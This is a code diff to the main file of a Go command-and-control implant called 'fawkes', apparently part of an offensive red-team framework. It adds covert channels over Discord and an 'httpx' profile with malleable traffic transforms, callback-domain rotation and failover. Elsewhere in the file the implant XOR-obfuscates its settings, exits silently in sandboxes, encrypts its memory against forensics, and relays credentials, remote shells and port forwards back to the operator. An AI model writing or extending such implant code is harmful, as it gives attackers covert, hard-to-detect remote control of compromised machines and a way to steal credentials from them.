@@ -22,8 +22,10 @@ import (
 	"github.com/google/uuid"
 
 	"fawkes/pkg/commands"
+	"fawkes/pkg/discord"
 	"fawkes/pkg/files"
 	"fawkes/pkg/http"
+	"fawkes/pkg/httpx"
 	"fawkes/pkg/profiles"
 	"fawkes/pkg/rpfwd"
 	"fawkes/pkg/socks"
@@ -50,6 +52,8 @@ var (
 	tlsVerify         string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
 	tlsFingerprint    string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
 	fallbackHosts     string = ""     // Comma-separated fallback C2 URLs for automatic failover
+	contentTypes      string = ""     // Comma-separated Content-Type values for request rotation
+	// bodyTransforms removed: use httpx C2 profile for malleable transforms
 	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
 	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
@@ -67,6 +71,14 @@ var (
 	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
 	sandboxGuard      string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
 	sleepMask         string = ""     // Encrypt sensitive agent/C2 data in memory during sleep cycles
+	discordBotToken          string = ""     // Discord bot token for Discord C2 profile
+	discordChannelID         string = ""     // Discord channel ID for Discord C2 profile
+	discordPollDelay         string = ""     // Seconds between Discord message polls (default: 10)
+	discordPollChecks        string = ""     // Max polling attempts per exchange (default: 10)
+	httpxConfig              string = ""     // Base64-encoded httpx agent config JSON (transforms, URIs, headers)
+	httpxDomains             string = ""     // Comma-separated httpx callback domains
+	httpxRotation            string = ""     // httpx domain rotation: fail-over, round-robin, random
+	httpxFailoverThreshold   string = ""     // httpx failover threshold (consecutive failures before switching)
 )
 
 func main() {
@@ -95,6 +107,11 @@ func runAgent() {
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
 			fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
+			contentTypes = xorDecodeString(contentTypes, keyBytes)
+			discordBotToken = xorDecodeString(discordBotToken, keyBytes)
+			discordChannelID = xorDecodeString(discordChannelID, keyBytes)
+			httpxConfig = xorDecodeString(httpxConfig, keyBytes)
+			httpxDomains = xorDecodeString(httpxDomains, keyBytes)
 			// Zero the XOR key — no longer needed after deobfuscation
 			zeroBytes(keyBytes)
 		}
@@ -233,6 +250,155 @@ func runAgent() {
 		c2 = profiles.NewTCPProfile(tcpProfile)
 		// Make TCP profile available to link/unlink commands
 		commands.SetTCPProfile(tcpProfile)
+	} else if discordBotToken != "" {
+		// Discord C2 mode — communicate through a Discord channel
+		log.Printf("discord c2")
+
+		// Parse Discord-specific poll parameters
+		pollDelay := 10
+		if discordPollDelay != "" {
+			if v, err := strconv.Atoi(discordPollDelay); err == nil && v > 0 {
+				pollDelay = v
+			}
+		}
+		pollChecks := 10
+		if discordPollChecks != "" {
+			if v, err := strconv.Atoi(discordPollChecks); err == nil && v > 0 {
+				pollChecks = v
+			}
+		}
+
+		discordProfile := discord.NewDiscordProfile(
+			discordBotToken,
+			discordChannelID,
+			encryptionKey,
+			sleepIntervalInt,
+			jitterInt,
+			pollChecks,
+			pollDelay,
+			debugBool,
+			proxyURL,
+		)
+		c2 = profiles.NewDiscordProfile(discordProfile)
+
+		// Seal the Discord config vault — encrypts bot token, channel ID, and
+		// encryption key with AES-256-GCM to reduce memory forensics exposure.
+		if err := discordProfile.SealConfig(); err != nil {
+			log.Printf("seal failed: %v", err)
+		}
+
+		// TCP P2P child management (Discord egress agents can also link to TCP children)
+		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
+		commands.SetTCPProfile(tcpP2P)
+
+		// Wire up delegate hooks for P2P routing through Discord
+		discordProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
+			return tcpP2P.DrainDelegatesOnly()
+		}
+		discordProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
+			return tcpP2P.DrainDelegatesAndEdges()
+		}
+		discordProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
+			tcpP2P.RouteToChildren(delegates)
+		}
+
+		// Wire up rpfwd hooks for reverse port forwarding
+		rpfwdManager := rpfwd.NewManager()
+		defer rpfwdManager.Close()
+		commands.SetRpfwdManager(rpfwdManager)
+		discordProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
+		discordProfile.HandleRpfwd = rpfwdManager.HandleMessages
+
+		// Wire up interactive hooks for PTY/terminal bidirectional streaming
+		discordProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+		discordProfile.HandleInteractive = commands.RouteInteractiveInput
+	} else if httpxConfig != "" {
+		// httpx C2 mode — malleable transforms, domain rotation, flexible message placement
+		log.Printf("httpx c2")
+
+		// Decode the base64-encoded agent config JSON
+		configBytes, err := base64.StdEncoding.DecodeString(httpxConfig)
+		if err != nil {
+			log.Printf("httpx config decode failed: %v", err)
+			return
+		}
+		agentCfg, err := httpx.ParseAgentConfig(configBytes)
+		if err != nil {
+			log.Printf("httpx config parse failed: %v", err)
+			return
+		}
+
+		// Parse callback domains
+		var domains []string
+		if httpxDomains != "" {
+			for _, d := range strings.Split(httpxDomains, ",") {
+				d = strings.TrimSpace(d)
+				if d != "" {
+					domains = append(domains, d)
+				}
+			}
+		}
+		if len(domains) == 0 {
+			log.Printf("httpx: no callback domains configured")
+			return
+		}
+
+		// Parse rotation and failover
+		rotation := "fail-over"
+		if httpxRotation != "" {
+			rotation = httpxRotation
+		}
+		failoverThreshold := 5
+		if httpxFailoverThreshold != "" {
+			if v, err := strconv.Atoi(httpxFailoverThreshold); err == nil && v > 0 {
+				failoverThreshold = v
+			}
+		}
+
+		httpxProfile := httpx.NewHTTPXProfile(
+			domains,
+			rotation,
+			failoverThreshold,
+			encryptionKey,
+			maxRetriesInt,
+			sleepIntervalInt,
+			jitterInt,
+			debugBool,
+			agentCfg,
+			proxyURL,
+		)
+		c2 = profiles.NewHTTPXProfile(httpxProfile)
+
+		// Seal the httpx config vault
+		if err := httpxProfile.SealConfig(); err != nil {
+			log.Printf("seal failed: %v", err)
+		}
+
+		// TCP P2P child management
+		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
+		commands.SetTCPProfile(tcpP2P)
+
+		// Wire up delegate hooks
+		httpxProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
+			return tcpP2P.DrainDelegatesOnly()
+		}
+		httpxProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
+			return tcpP2P.DrainDelegatesAndEdges()
+		}
+		httpxProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
+			tcpP2P.RouteToChildren(delegates)
+		}
+
+		// Wire up rpfwd hooks
+		rpfwdManager := rpfwd.NewManager()
+		defer rpfwdManager.Close()
+		commands.SetRpfwdManager(rpfwdManager)
+		httpxProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
+		httpxProfile.HandleRpfwd = rpfwdManager.HandleMessages
+
+		// Wire up interactive hooks
+		httpxProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+		httpxProfile.HandleInteractive = commands.RouteInteractiveInput
 	} else {
 		// HTTP egress mode (default)
 		var callbackURL string
@@ -258,6 +424,17 @@ func runAgent() {
 			}
 		}
 
+		// Parse content types (comma-separated list for request rotation)
+		var ctList []string
+		if contentTypes != "" {
+			for _, ct := range strings.Split(contentTypes, ",") {
+				ct = strings.TrimSpace(ct)
+				if ct != "" {
+					ctList = append(ctList, ct)
+				}
+			}
+		}
+
 		httpProfile := http.NewHTTPProfile(
 			callbackURL,
 			userAgent,
@@ -273,6 +450,7 @@ func runAgent() {
 			tlsVerify,
 			tlsFingerprint,
 			fallbackURLs,
+			ctList,
 		)
 		// Decode and apply custom HTTP headers from C2 profile
 		if customHeaders != "" {
@@ -612,12 +790,13 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 
 	// Send final response
 	response := structs.Response{
-		TaskID:      task.ID,
-		UserOutput:  result.Output,
-		Status:      result.Status,
-		Completed:   result.Completed,
-		Processes:   result.Processes,
-		Credentials: result.Credentials,
+		TaskID:          task.ID,
+		UserOutput:      result.Output,
+		Status:          result.Status,
+		Completed:       result.Completed,
+		Processes:       result.Processes,
+		Credentials:     result.Credentials,
+		ProcessResponse: result.Output,
 	}
 	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
 		log.Printf("send error: %v", err)
@@ -812,7 +991,16 @@ func clearGlobals() {
 	tlsVerify = ""
 	tlsFingerprint = ""
 	fallbackHosts = ""
+	contentTypes = ""
 	tcpBindAddress = ""
+	discordBotToken = ""
+	discordChannelID = ""
+	discordPollDelay = ""
+	discordPollChecks = ""
+	httpxConfig = ""
+	httpxDomains = ""
+	httpxRotation = ""
+	httpxFailoverThreshold = ""
 
 	// Operational parameters
 	sleepInterval = ""
